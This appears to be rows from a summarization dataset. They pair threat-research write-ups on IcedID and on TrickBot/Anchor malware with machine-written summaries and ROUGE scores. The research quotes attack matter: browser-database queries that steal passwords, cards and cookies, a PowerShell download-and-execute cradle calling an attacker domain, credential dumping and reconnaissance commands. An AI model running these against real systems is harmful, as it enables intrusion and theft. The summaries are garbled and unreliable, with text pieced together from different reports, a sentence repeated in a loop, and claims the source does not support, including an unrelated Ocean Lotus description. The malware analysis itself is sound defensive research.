is simple:In order to decode the strings statically, we can reimplement the algorithm and supply to it encoded buffers. Another easier solution is a decoder that loads the original malware and uses its function, as well as the encoded buffers given by offset. Example available here.Decoding strings is important for the further analysis. Especially because, in this case, we can find some debug strings left by the developers, informing us about the actions performed by the malware in particular fragments of code.A list of some of the decoded strings is available here.Available actionsThe overview of the main function of the bot is given below:The bot starts by opening a socket. Then, it beacons to the CnC and initializes threads for some specific actions: MiTM proxy, browser hooking engine, and a backconnect module (backdoor).It also calls to a function that initializes handlers, responsible for managing a variety of available actions. The full list:By analyzing closer to the handlers, we notice that similar to the first element, the main bot retrieves various elements as steganographically protected modules. The function responsible for decoding PNG files is analogical to the one found in the initial downloader:Those PNGs are used to carry the content of various updates for the malware. For example, an update to the list of URLs, but also other configuration files.Execution flow controlled by the CnCThe malware's backconnect feature allows the attacker to deploy various commands on the victim machine. The CnC can also instruct the bot to decode other malicious modules from inside that will be deployed in a new process. For example:If the particular command from the CnC is received, the bot will decompress another buffer that is stored inside the sample and inject it into a new instance of svchost.The way in which this injection is implemented reminds us of the older version of the loader. First, the buffer is decompressed with the help of RtlDecompressBuffer:Then, memory is allocated at the preferred address 0x3000.Some functions from NTDLL and other parameters will be copied to the structure, stored at the beginning of the shellcode.We can see there are some functions that will be used by the shellcode to load another embedded PE.Similar to in the old loader, the redirection to the new entry point is implemented via hook set on the RtlExitUserProcess function:After the buffer gets decompressed, we can see another piece of shellcode:This shellcode is an analogical loader of the headerless PE module. We can see inside the custom version of PE header that will be used by the loader:The custom header, containing minimal info from the PE headerDumped shellcode: 469ef3aedd47dc820d9d64a253652d7436abe6a5afb64c3722afb1ac83c3a3e1This element is an additional backdoor, deploying on demand a hidden VNC. It is also referenced by the authors by the name ""HDESK bot"" (Help Desk bot) because it gives the attacker direct access to the victim machine, as if it were a help-desk service. Converted to PE: 2959091ac9e2a544407a2ecc60ba941bThe ""HDESK bot"" deploys a hidden VNC to control the victim machineBelow, we will analyze the selected features implemented by the core bot. Note that many of the features are deployed on demand--depending on the command given by the CnC. In the observed case, the bot was also used as a downloader of the secondary malware, TrickBot.Installing its own certificateThe malware installs its own certificate. First it drops the generated file into the %TEMP% folder. Then, the file is loaded and added to the Windows certificate store.Fragment of Certificate generation function:Calling the function to add the certificate to store:Stealing passwords from IEWe can see that this bot goes after various saved credentials. Among the different methods used, we identified stealing data from the Credential Store. The used method is similar to the one described here.We can see that it uses the mentioned GUID ""abe2869f-9b47-4cd9-a358-c22904dba7f7"" that was used to salt the credentials. After reading the credentials from the store, the bot undoes the salting operation in order to get the plaintext.Stealing saved email credentialsThe bot is trying to use every opportunity to extract passwords from the victim machine, also going after saved email credentials.Stealing cookiesAs we observed during the behavioral analysis, the malware drops the sqlite3.dll in the temp folder. This module is further loaded and used to perform queries to browsers' databases with saved cookies.Fragment of code responsible for loading sqlite moduleThe malware searches the files containing cookies of particular browsers:We can see the content of the queries after decoding strings:SELECT host, path, isSecure, expiry, name, value FROM moz_cookiesIt targets Firefox, as well as Chrome and Chromium-based browsers:The list of targeted Chromium browsersFragment of the code performing queries:The list of queries to the Chrome's database:SELECT name, value FROM autofillSELECT guid, company_name, street_address, city, state, zipcode, country_code FROM autofill_profilesSELECT guid, number FROM autofill_profile_phonesSELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_namesSELECT card_number_encrypted, length(card_number_encrypted), name_on_card, expiration_month || ""/"" ||expiration_year FROM credit_cardsSELECT origin_url,username_value,length(password_value),password_value FROM logins WHERE username_value <> ''SELECT host_key, path, is_secure, (case expires_utc when 0 then 0 else (expires_utc / 1000000) - 11644473600 end), name, length(encrypted_value), encrypted_value FROM cookiesThe list of queries to the Firefox's database:SELECT host, path, isSecure, expiry, name, value FROM moz_cookiesSELECT fieldname, value FROM moz_formhistoryAll the found files are packed into a TAR archive and sent to the CnC.Similarly, it creates a ""passff.tar"" archive with stolen Firefox profiles:Hooking browsersAs mentioned earlier, the malware attacks and hooks browsers. Since the analogical functionality is achieved by different functions within different browsers, a set of installed hooks may be unique for each.First, the malware searches for targets among the running processes. It uses the following algorithm:It is similar to the one from the previous version (described here), yet we can see a few changes, i.e. the checksums are modified, and some additional checks are added. Yet, the list of the attacked browsers is the same, including the most popular ones: Firefox, MS Edge, Internet Explorer, and Chrome.The browsers are first infected with the dedicated IcedID module. Just like all the modules in this edition of IcedID, the browser implant is a headerless PE file. Its reconstructed version is available here: 9e0c27746c11866c61dec17f1edfd2693245cd257dc0de2478c956b594bb2eb3.After being injected, this module finds the appropriate DLLs in the memory of the process and sets redirections to its own code:Parsing the instructions and installing the hooks:Then, the selected API functions are intercepted and redirected to the plugin. Usually the hooks are installed at the beginning of functions, but there are exceptions to this rule. For example, in case of Internet Explorer, a function within the mswsock.dll has been intercepted in between:Looking at the elements in memory involved in intercepting the calls: the browser implant (headerless PE), and the additional memory page:Example of the hook in Firefox:Step 1: the function SSL_AuthCertificateHook has a jump redirecting to the implanted module:Step 2: The implanted module calls the code from the additional page with appropriate parameters:Step 3: The code at the additional page is a patched fragment of the original function. After executing the modified code, it goes back to the original DLL.The functionality of this hook didn't change from the previous version.WebinjectsThe bot gets the configuration from the CnC in the form of .DAT files that were mentioned before. First, the file is decoded by RC4 algorithm. The output must start from the ""zeus"" keyword, and is further encoded by a custom algorithm. Scripts dedicated for each site are identified by a script ID.After the files are loaded and decoded, we can see the content:There are multiple types of webinjects available to perform by the bot:Depending on the configuration, the bot may replace some parts of the website's code, or add some new, malicious scripts.Executing remote commandsIn case the commands implemented by the bot are not enough for the needs of the operator, the bot allows a feature of executing commands from the command line.The output of the run commands is sent back to the malware via named pipe, and then supplied back to the CnC.Mature banker and stealerAs we can see from the above analysis, IcedID is not only a banking Trojan, but a general-purpose stealer able to extract a variety of credentials. It can also work as a downloader for other modules, including covert ones, that look like harmless PNG files.This bot is mature, written by experienced developers. It deploys various typical techniques, including Zeus-style webinjects, hooks for various browsers, hidden VNC, and backconnect. Its authors also used several known obfuscation techniques. In addition, the use of customized PE headers is an interesting bonus, slowing down static analysis.In recent updates, the malware authors equipped the bot with steganography. It is not a novelty to see it in the threat landscape, but it is a feature that makes this malware a bit more stealthy.Indicators of CompromiseSandbox runs:https://app.any.run/tasks/8595602a-fa98-4cfa-80d7-98925091dc48/https://app.any.run/tasks/a7abba78-cf6d-4c68-b94c-4835d5becb13/MITREExecution: Command-Line Interface Execution through Module Load Scheduled Task Scripting Windows Managment IntstrumentationPersistence: Registry Run Keys/ Startup Folder Scheduled TaskPrivilege Escalation Scheduled TaskDefense Evasion ScriptingCredential Access Credentials in Files Credential DumpingDiscovery Network Share Discovery Query Registry Remote System Discovery System Information Discovery System Network Configuration DiscoveryLateral Movement Remote File CopySource: https://app.any.run/tasks/48414a33-3d66-4a46-afe5-c2003bb55ccf/ReferencesAbout the old variants of IceID:";"The IcedID Trojan is known as a banking Trojan, and indeed, one of its important features is the ability to steal data related to banking transactions. For this purpose, it injects its implants into browsers, hooks the API, and performs a ManInTheBrowser attack. The summary of the ITSecurity report is that the new version of IcedID is more stealthy than the previous one. It uses a loader to inject a headerless PE into svchost, which then redirects to the implanted PE. The implanted PE is divided into two sections, and the first memory page (representing the header) is empty. This type of payload is more stealthy than a full PE injection (as is more common). However, it was possible to reconstruct the header and analyze the sample like a normal PE. (An example of the reconstructed payload is available here: 395d2d250b296fe3c7c5b681e5bb05548402a7eb914f9f7fcdccb741ad8ddfea). The redirection to the implant was implemented by hooking the RtlExitUserProcess function within svchost's NTDLL. When svchost tried to terminate, it instead triggered a jump into the injected PE's entry point. The loader was also filling the pointer to the data page within the payload. We can see this pointer being loaded at the beginning of the payload's execution: In the new implementation, there is one more intermediate loader element implemented as shellcode. The diagram below shows the new loading chain: The shellcode has similar functionality that was previously implemented by the loader in form of a PE. First it injects itself into svchost. Then it decompresses and injects the payload, which as before is a headerless PE (analogical to the one described here: 395d2d250b296fe3c7c5b681e5bb05548402a7eb The ITSecurity report states that a malicious executable file has been detected on the system. The file is an obfuscated PE file that contains a shellcode loader. The shellcode loader is responsible for injecting a shellcode module into the system. The shellcode module is responsible for downloading a PNG file and injecting it into the system. The downloaded PNG file contains a malicious payload that is executed by the shellcode module. ### Instruction: Summarize the ITSecurity report ### Input: After unpacking it, we get the plain version: fbacdb66748e6ccb971a0a9611b065ac.Internally, this executable is simple and no further obfuscated. We can see that it first queries the CnC trying to fetch the second stage, requesting for a photo.png. It passes a generated ID to the URL. Example:/photo.png?id=0198d464fe3e7f09ab0005000000fa00000000Fragment of the function responsible for generating the image URLThe downloader fetches the PNG with the encoded payload. Then it loads the file, decodes it, and redirects the execution there. Below we can see the responsible function:Once the PNG is downloaded, it will be saved on disk and can be loaded again at system restart. The downloader will turn into a runner of this obfuscated format. In this way, the core executable is revealed only in memory and never stored on disk as an EXE file.The ""photo.png"" looks like a valid graphic file:Preview of the ""photo.png""In this fragment of code, we can see that the data from the PNG (section starting The ITSecurity report states that the Ocean Lotus malware is a sophisticated piece of malware that uses a variety of techniques to evade detection. The malware uses a variety of techniques to evade detection, such as obfuscation, polymorphism, and encryption. The malware also uses a variety of techniques to infect systems, such as exploit kits, driveby downloads, and social engineering. The malware also uses a variety of techniques to exfiltrate data from infected systems, such as steganography, encryption, and tunneling. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to avoid detection, such as antidebugging, antivirtualization, and antisandboxing techniques. The malware also uses a variety of techniques to The latest header is shorter by one DWORD than the previous one. The module in the old format: bbd6b94deabb9ac4775befc3dc6b516656615c9295e71b39610cb83c4b005354The core bot (headerless PE)6aeb27d50512dbad7e529ffedb0ac153 a reconstructed PELooking inside the strings of this module, we can guess that this element is responsible for all the core malicious operations performed by this malware. It communicates with the CnC server, reads the sqlite databases in order to steal cookies, installs its own certificate for ManInTheBrowser attacks, and eventually downloads other modules.We can see that this is the element that was responsible for generating the observed requests to the CnC:During the run, the malware is under constant supervision from the CnC. The communication with the server is encrypted.String obfuscationThe majority of the strings used by the malware are obfuscated and decoded before use. The algorithm used for decoding is simple:In order to decode the strings statically, we can reimplement the algorithm and supply to it encoded buffers. Another easier solution is a decoder that loads the original malware and uses its function, as well as the encoded buffers given by offset. Example available here.Decoding strings is important for the further analysis. Especially because, in this case, we can find some debug strings left by the developers, informing us about the actions performed by the malware in particular fragments of code.A list of some of the decoded strings is available here.Available actionsThe overview of the main function The report summarizes the ITSecurity report. IceID is a banking trojan that has been around since 2009. It is a modular malware that can be used to steal banking credentials, as well as other types of credentials. The malware is written in C++ and uses a variety of techniques to evade detection, such as obfuscation and custom PE headers.";en;{'r': 0.2530487804878049, 'p': 0.8829787234042553, 'f': 0.39336492544731705};{'r': 0.1922692435854715, 'p': 0.7871759890859482, 'f': 0.3090519518526567};{'r': 0.24923780487804878, 'p': 0.8696808510638298, 'f': 0.3874407548312033}
https://www.cybereason.com/blog/research/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware;Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware;"IntroductionResearch By: Assaf Dahan, Lior Rochberger, Eli Salem, Mary Zhao, Niv Yona, Omer Yampel and Matt HartCybereason Nocturnus is monitoring a new wave of targeted campaigns against financial, manufacturing and retail businesses that began in early October. Similar to attacks previously reported by Cybereason, this campaign started with a TrickBot infection and progressed into a hacking operation targeting sensitive financial systems.However, unlike previous operations that focused on causing a massive ransomware infection (Ryuk and LockerGoga) by compromising critical assets like the domain controller, this new operation is focused on targeting point of sale (PoS) systems. The campaign leverages a newly discovered malware family called Anchor exclusively for high-profile targets.Learn more about additional attacks that leverage TrickBot.This research focuses on the following aspects of the TrickBot-Anchor attack:Anatomy of the Attack: A step-by-step anatomy of the attacks, including infection vectors and a dissection of the tools and techniques used by the attackers. New Malware: The discovery of a new malware family called Anchor, which includes the Anchor_DNS and a new, undocumented Anchor that has been operating since August 2018 (and potentially even earlier). The Anchor malware is a backdoor used very selectively on high-profile targets, and appears to be tightly connected to TrickBot, potentially even authored by the same individuals who created TrickBot.While this blog does not discuss attribution explicitly, the nature of these attacks, specifically the motivation, some of the tools and techniques detailed, have certain resemblance to past attacks that were linked to the financially-motivated FIN6 threat actor, a group that is known to target POS systems and has been linked to TrickBot infections in the past.Lastly, our blog emphasizes the gravity and danger that lies in commodity malware infections, as they have the potential of escalating into a hacking operation. This can easily lead to a disastrous outcome, whether it be a ransomware infection or theft of sensitive financial data.Key PointsThe TrickBot-Anchor Operation: Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe.Cybereason Nocturnus is investigating a series of targeted attacks against financial, manufacturing, and retail businesses across the United States and Europe. Targets POS Systems: The attacks target POS systems to steal sensitive information by taking over critical assets in the victims' network.The attacks target POS systems to steal sensitive information by taking over critical assets in the victims' network. Deploys A Backdoor on High-value Targets: On certain high-profile targets, the attackers selectively use a new variant of the rare Anchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers.On certain high-profile targets, the attackers selectively use a new variant of the rare Anchor_DNS tool. Anchor_DNS is a backdoor that uses the DNS protocol to stealthily communicate with C2 servers. Uses a New, Undocumented Malware : In addition to the new Anchor_DNS variant, the attackers use a completely new and previously undocumented malware dubbed Anchor. Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot.: In addition to the new Anchor_DNS variant, the attackers use a completely new and previously undocumented malware dubbed Anchor has been in operation since August 2018 and appears to be tightly related to TrickBot. Adds Enhancements to TrickBot: This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing passwords from various products, including the KeePass password manager.This attack adds a new and enhanced stealing module to TrickBot that focuses on stealing passwords from various products, including the KeePass password manager. Uses Known Tools for Reconnaissance and Lateral Movement: The majority of the initial interactive hacking operation uses the known tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement.The majority of the initial interactive hacking operation uses the known tools Meterpreter, PowerShell Empire, and Cobalt Strike for reconnaissance and lateral movement. Abuses the Trust of Certificate Authorities: Many of the payloads in the attacks are signed binaries, which demonstrates the ever-growing trend of signed threats that abuse the trust of certificate authorities to bypass detection.Table of ContentsAnatomy of the Attack: A Step-by-Step AnalysisAn overview of the attack tree, as seen in the Cybereason Defense Platform.Infection VectorDownloading and injecting TrickBot.The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named ""Annual Bonus Report.doc"". When the user clicks on the link, the TrickBot dropper downloads onto the target machine. This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.Phishing email that tricks the user into downloading TrickBot.The TrickBot DownloaderThe campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document. When the user double-clicks the file, they are presented with a decoy message box. To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.TrickBot displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document.While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools. They abuse the relative trust that is given to signed binaries to avoid detection.File metadata properties for the fake Microsoft Word Document.Signed malware is an evasive initial entry point into an organization.The message box distracts the user as TrickBot's payload is downloaded, stored in the %TEMP% folder, and executed. A new process injects the TrickBot payload into a svchost.exe process.svchost.exe injected code malicious evidence as seen in the Cybereason Platform.Domain associated with the TrickBot payload download.The TrickBot PayloadOnce TrickBot's main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network. This information is crucial, as it determines the course of the attack.Checking Network ConnectivityTrickBot checks for Internet connectivity by trying to access several designated domains. These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains. It collects and sends information about where the target machine is located to the C2 servers.Browser History and Credential TheftAfter TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity. The module core-parser.dll is reflectively loaded into svchost.exe. core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.core-parser.dll injected into svchost.dll.TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server. The C2 server is responsible for handling the stolen data.A list of C2 servers extracted from TrickBot's configuration.TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).esentutl /p /o C:\Users\[USER]\AppData\Local\Temp\grabber_temp.edbThis command dumps the Extensible Storage Engine (ESE) database format.Application-specific Credential TheftThis variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager. TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files. Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.KeePass stealing brute force tool.TrickBot's stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.TrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.Reconnaissance CommandsIn addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe. They gather information on:All trusted domains, domains, and domain controllersA list of computers and network devices on the networkThe infected machine user and groups the user belongs toThe infected machine, including machine name, operating system, workstation domain, and more informationNetwork adapters that have connected to the machine and DNS serversThe net.exe process tree.Nltest / domain_trusts /all_trustsNet view /allNltest /domain_trustsNet view /all /domainIpconfig /allNet config workstationNslookup ""-q=srv_kerberos._tcp""/c ""start microsoft-edge:http://127.0.0.1:52715/11984""Reconnaissance commands launched by TrickBot.The attacker also uses PowerShell to test DNS entry settings. They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.TrickBot testing DNS settings.With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.From TrickBot Infection to Interactive HackingThe threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.PowerShell PayloadsThe threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a secondary server and, once it's downloaded, immediately execute it on the target machine through PowerShell.powershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c ""IEX ((new-object net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&x=[base64]'))""The northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from the user's hostname and the current process ID.Information sent along each POST request in the payload.A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.The PowerShell payloads using WMI to probe for system information.This information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response matches the value cex01. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.The main loop that sends a POST request to the server.Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request with the ""a"" parameter.Meterpreter & Cobalt Strike ImplantsThe attack tree demonstrating the beginning of the hacking operation using Meterpreter.Meterpreter ImplantThe attackers use a Meterpreter implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:Metsrv.dll: For Meterpreter, where the protocol and extension systems are implementedFor Meterpreter, where the protocol and extension systems are implemented Ext_server_priv.x86.dll: For privilege escalationFor privilege escalation Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissanceCybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.Examining the loaded modules shows which Metasploit modules are loaded.The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.Cobalt Strike ImplantUsing Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.Attackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process.Detection of Cobalt Strike, Meterpreter, and shellcode execution.The attacker uses the following metasploit modules:ext_server_extapi.x86.dll : Obtains clipboard data and manipulates and decrypts the NTDS file: Obtains clipboard data and manipulates and decrypts the NTDS file ext_server_priv.x86.dll : Performs privilege escalation: Performs privilege escalation Ext_server_stdapi.x86.dll : Performs reconnaissance activity: Performs reconnaissance activity Bypassuac.x64.dll: A post-exploitation module used to bypass User Account ControlPost-exploitation modules reflectively loaded to rundll32.exeThe connection to the external IP address 199.217.115[.]53 on port 8443.Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.Active Directory Discovery using Cobalt StrikeThe threat actor uses known Cobalt Strike modules to enumerate Active Directory information:The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine's user is in the admin or domain admin group.After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.The obfuscated and compressed PowerShell command.The decoded PowerShell command that attempts to gather domain controller information.Active Directory Discovery using ADfindThe attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.adfind.exe -f ""(objectcategory=organizationalUnit)""adfind.exe -gcb -sc trustdmpadfind.exe -f ""objectcategory=computer""adfind.exe -sc trustdmpadfind.exe -f ""(objectcategory=person)""adfind.exe -subnets -f (objectCategory=subnet)adfind.exe -f ""(objectcategory=group)""The ADfind tool has reportedly been used previously in attacks related to FIN6.New Anchor_DNS Variant DiscoveredOne of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers. Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\Oldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:No self-deletion mechanism shown in previous samplesNo internet connectivity checks using legitimate online web servicesA built-in capability to check for C2 availability using ICMP (ping)Additional partial string encryption and code obfuscationStatic Analysis ObservationsFile name SHA-1 anchorDNS_x64.exe 5f1ad1787106de9725005d8da33d815d0994ee83anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS. This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of Anchor_DNS.`PDB PATH: C:\simsim\anchorDNS.v5\Bin\x64\Release\anchorDNS_x64.pdbMany strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.Multiple typos and grammatical mistakes in the Anchor_DNS code.The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.Anchor_DNS was able to stay under-the-radar by using specific execution flags. If these command-line arguments are not supplied, the Anchor_DNS terminates.-i flag: creates a scheduled task with the following naming convention (e.g ""Notepad++ autoupdate94654""): [random folder name in %APPDATA%] autoupdate[random_number]Writes NTFS ADS files ($TASK, $GUID, $FILE)Alternate Data Stream ADS Contents Decoded Contents edskype.exe:$FILE QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW1pbmdcU2t5cGVcZWRza3lwZS5leGU= C:\Users\user\AppData\Roaming\Skype\edskype.exe edskype.exe:$TASKTm90ZXBhZCsrIGF1dG91cGRhdGUjOTQ2NTQNotepad++ autoupdate94654 edskype.exe:$GUID [BASE64] /anchor_dns/[COMPUTER_NAME]_[Windows_Version].[clientID]/-u flag: New Variant : executes the malware's main communication module with the C2 Old Variant: Drops a copy in %TEMP% Creates ADS files ($GUID, $FILE)-s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done. --log=: expects a file name to write log file in C:\Users\[USER]Contents of the debug file created by Anchor_DNS.C2 CommunicationOlder and newer versions of Anchor_DNS communicate over DNS. However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server's availability using the ICMP protocol.Determining C2 server connectivity.DNS TunnelingAnchor_DNS communicates with the C2 servers over DNS using DNS Tunneling. With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security's report on an older Anchor_DNS sample.By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.Example of DNS Tunneling traffic generated by Anchor_DNS.Discovery of The Anchor Malware and Its Connection to TrickBotDuring our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed Anchor by its authors and has been active since August 2018. Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS. However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.Earliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)PDB path for the earliest Anchor sample found.Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.List of Anchor payloads found on VirusTotal with 0/0 detection rate.The malware has both x86 and x64 versions and contains an installer component to install the malware.Payload Name Hash PDB Path anchorInstaller_x86 3ed09498214d93c9ec14a15286546d242ad58943 4bba60ff11f8b150b004960c658ad74a707ebcea D:\MyProjects\secondWork\Anchor\Win32\Release\anchorInstaller_x86.pdb C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\anchorInstaller_x86.pdb anchorInstaller_x64 e75983b073ff0632e35e237f6622466c2699687c Anchor_x86 Bd26238fb7d7e16ea79073d882bba00d34dd859c F3683a0c12154e8bf44d9d942db3eac9e930e7a5 9ebb541dcb24d564448a6f5e00c613b73eba7148 D:\MyProjects\secondWork\Anchor\Win32\Release\Anchor_x86.pdb C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\Anchor_x86.pdb D:\Anchor\Anchor\Win32\Release\Anchor_x86.pdb Anchor_x64 46c595e580719a4c54f55b4041f81d6e50ab4062 e5dc7c8bfa285b61dda1618f0ade9c256be75d1a D:\Anchor\x64\Debug\Anchor_x64.pdbC:\[JOB]\Anchor\x64\Release\Anchor_x64.pdbThe Anchor payload is delivered by AnchorInstaller AnchorInstaller unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or %SYSTEMROOT%\System32 folder. The dropped DLL is loaded by the service netTcpSvc, which is created by the malware.Anchor service persistence found in the registry.NTFS ADS File - Storing the GUIDSimilar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:Anchor GUID stored as an NTFS ADS.Unlike Anchor_DNS, which stores the information in Base64, Anchor's GUID is saved in cleartext.Self DeletionAnchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:cmd.exe /c timeout 1 && del C:\Users\[USER]\[SAMPLE_LOCATION]""cmd.exe /C PowerShell 'Start-Sleep 5, Remove-Item C:\Users\[USER]\[SAMPLE_LOCATION]'C2 CommunicationSimilar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers. It uses the following hardcoded web services to test connectivity:Once it has established connectivity, it communicates with a set of hardcoded C2 servers.Communication with a set of hardcoded C2 servers.The request and response follow the same C2 communication format as TrickBot.The request and response format for Anchor.Connecting Anchor / Anchor_DNS to TrickBotAnchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are also several other similarities noted below.GUID Generation FunctionThe GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot. The GUID follows this pattern:[Machine_NAME]_[Windows_Version].[Client_ID]Malware Name GUID Anchor_DNS /anchor_dns/MACHINE-001_W617601.D4CB942AA18EFF519DCBCAE88A0A99FB/ Anchor /anchor001/jujubox-PC_W617601.6E8516CA48318FB2904E2027B5350B26 Trickbot /mor49/DAVID-PC_W10017134.55C60B5D13499341D72F5A34C632CFD9External IP Check Web ServicesBoth Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine. The same list is also used by TrickBot:checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.Shared C2 InfrastructureTrickBot, Anchor, and Anchor_DNS 